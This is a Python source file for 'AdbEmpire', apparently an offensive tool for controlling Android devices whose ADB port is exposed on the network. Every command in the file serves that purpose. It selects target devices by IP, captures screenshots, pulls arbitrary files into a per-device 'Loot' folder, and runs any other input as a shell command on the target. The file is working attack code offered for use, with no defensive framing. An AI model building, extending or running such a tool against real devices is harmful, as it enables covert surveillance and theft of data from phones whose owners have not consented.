from ppadb.client import Client as AdbClient; from ppadb.device import Device
from Shared.prompt import Patterns, Symbols
import os
import os.path as path

class Empire:
    client: AdbClient
    prompt: any

    devices: list[Device]
    deviceCount: int

    targetDevice: (Device | None)

    def __init__(self, prompt) -> None:
        self.client = AdbClient(host = '127.0.0.1', port = 5037) 

        self.prompt = prompt

        self.devices = self.client.devices()
        self.deviceCount = len(self.devices)

        self.targetDevice = None

    def getDevice(self, deviceIp: str) -> (Device | None):
        devices = self.devices
        serial = f'{deviceIp}:5555'

        for device in devices:
            if device.serial == serial:
                return device
            
        return None
    
    def isDeviceActive(self, device: Device) -> bool:
        try:
            device.get_state()
            return True
        except:
            return False
        
    def setTargetDevice(self, device: Device | None) -> None:

        prompt = self.prompt
        self.targetDevice = device

        if (device == None):
            prompt.setPrompt(Symbols.prompt)
            return
        
        devIp = device.serial.split(':')[0]

        prompt.setPrompt(Patterns.interactive % devIp)

    def isInInteractive(self) -> bool:
        return self.targetDevice != None
    
    def checkLootDir(self, targetDeviceIp: str) -> None:
        prompt = self.prompt

        deviceLootDirPath = f'./Loot/{targetDeviceIp}'
        if not (path.exists(deviceLootDirPath)):
            
            ssDirPath = f'{deviceLootDirPath}/Screenshots'
            fileDirPath = f'{deviceLootDirPath}/Files'

            prompt.info('Making Loot Directory For Device..')

            os.mkdir(deviceLootDirPath)
            os.mkdir(ssDirPath); os.mkdir(fileDirPath)
        
    def handleUserCmd(self, userInput: str) -> None:
        inputSplit = userInput.split(' ')

        command, args = inputSplit[0], inputSplit[1:]

        prompt = self.prompt
        devices = self.devices
        if not self.isInInteractive():

            match command.lower():
                case 'exit':
                    prompt.info('Exiting AdbEmpire...')
                    exit(0)

                case 'interact':
                    if len(args) < 1:
                        prompt.failure('You Need To Specify An IP!')
                        return
                    
                    deviceIp = args[0]
                    device = self.getDevice(deviceIp)

                    if not self.isDeviceActive(device):
                        prompt.failure('Device Is Not Active!')
                        return
                    
                    self.setTargetDevice(device)
                
                case 'devices':
                    self.prompt.showDevices(self.devices)

                case 'clear' | 'cls':
                    os.system('cls')
                
                case _:
                    prompt.failure('Invalid Command!')
        else:
            # user is interacting with client
            targetDevice = self.targetDevice
            targetDeviceIp = targetDevice.serial.split(':')[0]

            match command.lower():
                case 'exit':
                    self.setTargetDevice(None)
                
                case "screenshot":
                    if len(args) < 1:
                        prompt.failure('Provide A Screenshot Name!')
                        return
                    
                    ssName = args[0]
                    self.checkLootDir(targetDeviceIp)

                    ssResult = targetDevice.screencap()

                    with open(f'./Loot/{targetDeviceIp}/Screenshots/{ssName}', 'wb') as ssFile:
                        ssFile.write(ssResult)
                        ssFile.close()

                    prompt.success('Took Screenshot Successfully!')

                case "pull":
                    if len(args) < 2:
                        prompt.failure('Provide A File Path And An Output Path!')
                        return
                    
                    filePath = args[0]
                    outputFileName = args[1]
                    
                    self.checkLootDir(targetDeviceIp)

                    targetDevice.pull(filePath, f'./Loot/{targetDeviceIp}/Files/{outputFileName}')

                    prompt.success('Completed Pulling.')
                case _:
                    output = targetDevice.shell(userInput)
                    print(output)
            

